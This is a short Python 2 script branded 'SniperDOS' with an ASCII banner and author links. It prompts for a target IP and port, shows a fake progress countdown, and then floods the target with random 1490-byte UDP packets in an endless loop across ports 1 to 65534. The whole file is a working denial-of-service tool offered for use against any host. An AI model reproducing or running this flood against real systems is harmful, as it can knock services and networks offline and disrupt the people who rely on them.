import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")

print "   ____     _              ___  ____  ____"
print "  / __/__  (_)__  ___ ____/ _ \/ __ \/ __/"
print " _\ \/ _ \/ / _ \/ -_) __/ // / /_/ /\ \  "
print "/___/_//_/_/ .__/\__/_/ /____/\____/___/  "
print "          /_/                             "
print "--------------------------------------------------------"
print "Author    : Anubhav Kashyap"
print "github   : https://github.com/anubhavanonymous"
print "Instagram : https://www.instagram.com/anubhavanonymous"
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Starting server")
print "working "
time.sleep(5)
print "35% Done "
time.sleep(5)
print "55% Done"
time.sleep(5)
print "78% Done"
time.sleep(5)
print "89% Done"
time.sleep(5)
print "100% Done"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
